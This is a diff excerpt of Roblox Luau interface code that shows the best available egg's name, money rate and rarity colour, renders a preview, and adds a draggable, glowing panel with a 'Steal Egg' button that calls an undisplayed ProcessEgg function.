+	local Key=string.lower(tostring(Name or "")):gsub("%s+","")
+
+	for RarityKey,RarityData in pairs(Rarity.Rarities or {}) do
+		local Key1=string.lower(tostring(RarityKey)):gsub("%s+","")
+		local Key2=string.lower(
+			tostring(
+				type(RarityData)=="table" and RarityData.DisplayName or ""
+			)
+		):gsub("%s+","")
+
+		if Key1==Key or Key2==Key then
+			return RarityData
+		end
+	end
+
+	return nil
+end
+
+local function GetRarityColor(Name)
+	local Data=GetRarityConfig(Name)
+
+	if Data then
+		local Color=Data.Color
+
+		if typeof(Color)=="ColorSequence" then
+			return Color.Keypoints[1].Value
+		end
+
+		if typeof(Color)=="Color3" then
+			return Color
+		end
+	end
+
+	return Color3.fromRGB(170,190,178)
+end
+
+local CurrentPreviewCategory=nil
+
+local function ClearPreview()
+	for _,Object in ipairs(Preview:GetChildren()) do
+		if not Object:IsA("UICorner") then
+			Object:Destroy()
+		end
+	end
+end
+
+local function UpdatePreview(Category)
+	if not Category then
+		ClearPreview()
+		CurrentPreviewCategory=nil
+		return
+	end
+
+	if CurrentPreviewCategory==Category and Preview:FindFirstChild("AssetViewport") then
+		return
+	end
+
+	CurrentPreviewCategory=Category
+	ClearPreview()
+
+	local OK,Viewport=pcall(function()
+		return AssetViewport.Mount(Preview)
+	end)
+
+	if not OK or not Viewport then
+		return
+	end
+
+	Viewport.Name="AssetViewport"
+	Viewport.Size=UDim2.fromScale(1,1)
+	Viewport.Position=UDim2.fromScale(0.5,0.5)
+	Viewport.AnchorPoint=Vector2.new(0.5,0.5)
+	Viewport.BackgroundTransparency=1
+	Viewport.Parent=Preview
+
+	pcall(function()
+		AssetViewport.ShowAsset(Category,Viewport,true)
+	end)
+end
+
+local UpdateBestEgg
+
+local function GetBestEggData()
+	local OK,Result=pcall(function()
+		return GetBestEgg()
+	end)
+
+	if OK and Result and IsValidEgg(Result) then
+		return Result
+	end
+
+	return nil
+end
+
+UpdateBestEgg=function()
+	local Egg=GetBestEggData()
+
+	if not Egg then
+		NameLabel.Text="No Egg"
+		MoneyLabel.Text="Money: 0"
+		RarityLabel.Text="Rarity: Unknown"
+		RarityLabel.TextColor3=Color3.fromRGB(255,255,255)
+		UpdatePreview(nil)
+		return
+	end
+
+	NameLabel.Text=tostring(Egg.DisplayName or Egg.Category or "Unknown")
+	MoneyLabel.Text="Money: "..FormatMoney(Egg.EarningRate or 0)
+
+	local Category=Egg.Category
+	local AssetData=Assets and Assets.Directory and Assets.Directory[Category]
+
+	local RarityName=nil
+
+	if AssetData then
+		RarityName=AssetData.Rarity
+	end
+
+	RarityName=RarityName or Egg.Rarity or Egg.RarityName or "Unknown"
+
+	local RarityData=GetRarityConfig(RarityName)
+	local DisplayRarity=RarityName
+
+	if RarityData and RarityData.DisplayName then
+		DisplayRarity=RarityData.DisplayName
+	end
+
+	RarityLabel.Text="Rarity: "..tostring(DisplayRarity)
+	RarityLabel.TextColor3=GetRarityColor(RarityName)
+
+	UpdatePreview(Category)
+end
+
+local Running=false
+
+StealButton.MouseButton1Click:Connect(function()
+	if Running then
+		StealButton.Text="Already running."
+
+		task.delay(1.5,function()
+			if Running then
+				StealButton.Text="Already running."
+			end
+		end)
+
+		return
+	end
+
+	Running=true
+	StealButton.Text="Already running."
+
+	task.spawn(function()
+		local OK,Error=pcall(function()
+			ProcessEgg()
+		end)
+
+		Running=false
+		StealButton.Text="Steal Egg"
+
+		if not OK then
+			warn(Error)
+		end
+	end)
+end)
+
+task.spawn(function()
+	while GUI.Parent do
+		UpdateBestEgg()
+		task.wait(0.5)
+	end
+end)
+
+task.spawn(function()
+	local T=0
+
+	while GUI.Parent do
+		T+=0.025
+
+		local R=(math.sin(T)+1)/2
+
+		local Red=Color3.fromRGB(
+			255,
+			math.floor(35+R*40),
+			math.floor(35+R*40)
+		)
+
+		local Blue=Color3.fromRGB(
+			math.floor(35+R*40),
+			math.floor(100+R*80),
+			255
+		)
+
+		local Alpha=(math.sin(T*2)+1)/2
+
+		Stroke.Color=Red:Lerp(Blue,Alpha)
+		Glow.Color=Blue:Lerp(Red,Alpha)
+
+		task.wait(0.025)
+	end
+end)
+
+local Dragging=false
+local DragStart
+local StartPosition
+
+Main.InputBegan:Connect(function(Input)
+	if Input.UserInputType==Enum.UserInputType.MouseButton1
+		or Input.UserInputType==Enum.UserInputType.Touch then
+
+		Dragging=true
+		DragStart=Input.Position
+		StartPosition=Main.Position
+
+		Input.Changed:Connect(function()
+			if Input.UserInputState==Enum.UserInputState.End then
+				Dragging=false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(Input)
+	if not Dragging then
+		return
+	end
+
+	if Input.UserInputType~=Enum.UserInputType.MouseMovement
+		and Input.UserInputType~=Enum.UserInputType.Touch then
+		return
+	end
+
+	local Delta=Input.Position-DragStart
+
+	Main.Position=UDim2.new(
+		StartPosition.X.Scale,
+		StartPosition.X.Offset+Delta.X,
+		StartPosition.Y.Scale,
+		StartPosition.Y.Offset+Delta.Y
+	)
+end)
